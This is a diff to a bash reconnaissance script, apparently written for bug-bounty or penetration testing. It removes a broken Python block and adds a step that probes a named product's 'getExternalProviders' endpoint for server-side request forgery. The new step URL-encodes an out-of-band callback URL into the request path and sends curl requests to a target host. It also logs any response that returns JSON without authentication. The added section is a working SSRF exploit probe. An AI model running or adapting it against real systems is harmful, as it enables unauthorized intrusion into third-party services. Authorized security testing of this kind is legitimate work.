@@ -58,17 +58,6 @@ echo "[1] Swagger loaded: ${NPATH} paths"
 # ── Step 2: Extract all unique paths from Swagger ────────────────────────────
 echo ""
 echo "[2] Extracting all Swagger paths..."
-python3 - <<'PYEOF' | tee "${OUT}/swagger-paths.txt"
-import json, sys
-
-try:
-    d = json.load(open("/dev/stdin"))
-except:
-    import os
-    d = json.load(open(sys.argv[1] if len(sys.argv)>1 else ""))
-
-PYEOF
-
 python3 - "${SWAGGER_JSON}" <<'PYEOF' | tee "${OUT}/swagger-paths.txt"
 import json, sys
 
@@ -208,6 +197,55 @@ for BPATH in \
         printf 'GET\t%s\t%s\t%s\n' "${BPATH}" "${CODE}" "${BODY}" >> "${OUT}/unauth-json-hits.txt"
     fi
 done
+
+# ── Step 6: LegacyControllerBaseUrl — URL-in-path SSRF test ─────────────────
+# Swagger exposes: GET /api/1p/external/v1/{LegacyControllerBaseUrl}:getExternalProviders
+# The URL is DIRECTLY in the path segment — server may make outbound request to it.
+# "1p" = first-party / internal endpoint, potentially no auth required.
+echo ""
+echo "[6] Testing LegacyControllerBaseUrl URL-in-path endpoint (potential SSRF)..."
+OOB="${OOB_URL:-}"
+if [ -n "${OOB}" ]; then
+    # URL-encode the OOB URL for path injection
+    OOB_ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "${OOB}" 2>/dev/null)
+    for TEST_URL in "${OOB}/1p-ssrf-chronicle" "http://${OOB#https://}/1p-ssrf"; do
+        ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "${TEST_URL}" 2>/dev/null)
+        echo "[6] Testing with OOB URL: ${TEST_URL}"
+        RESP=$(curl -sk --max-time 20 \
+            -H "User-Agent: ${UA}" \
+            -H "Accept: application/json" \
+            ${SOAR_TOKEN:+-H "AppKey: ${SOAR_TOKEN}"} \
+            -w "\n__CODE__%{http_code}" \
+            "https://${TARGET}/api/1p/external/v1/${ENC}:getExternalProviders" 2>/dev/null)
+        CODE="${RESP##*__CODE__}"
+        BODY="${RESP%__CODE__*}"
+        echo "  [${CODE}] GET /api/1p/external/v1/<oob-url>:getExternalProviders"
+        echo "  BODY: ${BODY}" | head -5
+        printf '1P-SSRF\t%s\t%s\t%s\n' "${TEST_URL}" "${CODE}" "${BODY}" >> "${OUT}/unauth-json-hits.txt"
+    done
+else
+    # No OOB URL set — probe with a safe canary to see if the endpoint responds
+    echo "[6] OOB_URL not set — probing with safe URL to check endpoint auth behavior..."
+    for TEST_URL in "https://example.com" "https://app.siemplify-soar.com"; do
+        ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "${TEST_URL}" 2>/dev/null)
+        RESP=$(curl -sk --max-time 15 \
+            -H "User-Agent: ${UA}" \
+            -H "Accept: application/json" \
+            ${SOAR_TOKEN:+-H "AppKey: ${SOAR_TOKEN}"} \
+            -w "\n__CODE__%{http_code}" \
+            "https://${TARGET}/api/1p/external/v1/${ENC}:getExternalProviders" 2>/dev/null)
+        CODE="${RESP##*__CODE__}"
+        BODY="${RESP%__CODE__*}"
+        IS_JSON=$(printf '%s' "${BODY}" | python3 -c "import sys,json; json.loads(sys.stdin.read()); print('yes')" 2>/dev/null || echo "no")
+        echo "  [${CODE}][json=${IS_JSON}] GET .../1p/.../${TEST_URL}:getExternalProviders"
+        if [ "${IS_JSON}" = "yes" ] && [ "${CODE}" != "401" ] && [ "${CODE}" != "403" ]; then
+            echo "  *** NON-AUTH JSON RESPONSE ***"
+            printf '%s' "${BODY}" | python3 -m json.tool 2>/dev/null | head -10
+            printf '1P-SSRF\t%s\t%s\t%s\n' "${TEST_URL}" "${CODE}" "${BODY}" >> "${OUT}/unauth-json-hits.txt"
+        fi
+    done
+    echo "[6] NOTE: Re-run with OOB_URL=https://<interactsh-id>.oast.pro for SSRF confirmation"
+fi
 
 # ── Summary ──────────────────────────────────────────────────────────────────
 echo ""
